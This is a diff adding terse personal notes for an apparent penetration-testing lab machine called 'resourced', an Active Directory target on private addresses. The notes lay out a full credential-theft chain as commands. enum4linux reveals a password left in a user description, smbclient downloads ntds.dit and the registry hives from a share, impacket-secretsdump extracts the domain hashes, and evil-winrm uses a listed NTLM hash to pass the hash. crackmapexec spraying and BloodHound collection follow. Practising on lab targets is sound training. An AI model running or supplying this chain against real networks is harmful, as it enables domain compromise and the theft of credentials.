@@ -1,0 +1,43 @@
+resourced
+
+ 192.168.165.175
+ 
+ 
+enum4linux 192.168.165.175
+V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
+
+select all users alongwith its description
+same into users_raw.txt
+
+cat user_raw.txt| cut -d ':' -f 5 | cut -d ' ' -f 2 >usrs.txt
+
+Potential usrname and password
+V.Ventz
+HotelCalifornia194!
+
+smbclient -L \\\\192.168.165.175\\
+smbclient -L \\\\192.168.165.175\\ -U V.Ventz
+smbclient \\\\192.168.165.175\\"Password Audit" -U V.Ventz
+
+cd "Active Directory"
+mget *
+
+cd ..
+cd registry\
+mget *
+
+Put all three files in single directory 
+SECURITY  SYSTEM  ntds.dit
+ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+
+evil-winrm  -i 192.168.165.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+evil-winrm -i 192.168.51.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+19a3a7550ce8c505c2d46b5e39d6f808
+
+
+
+crackmapexec winrm 192.168.51.175  -u users -H hashesh
+crackmapexec winrm 192.168.165.175 -u usr.txt -H hash.txt 
+
+
+bloodhound-python -dc-ip 192.168.51.175 -u L.Livingstone --hashes '19a3a7550ce8c505c2d46b5e39d6f808' -c all -ns 192.168.51.175
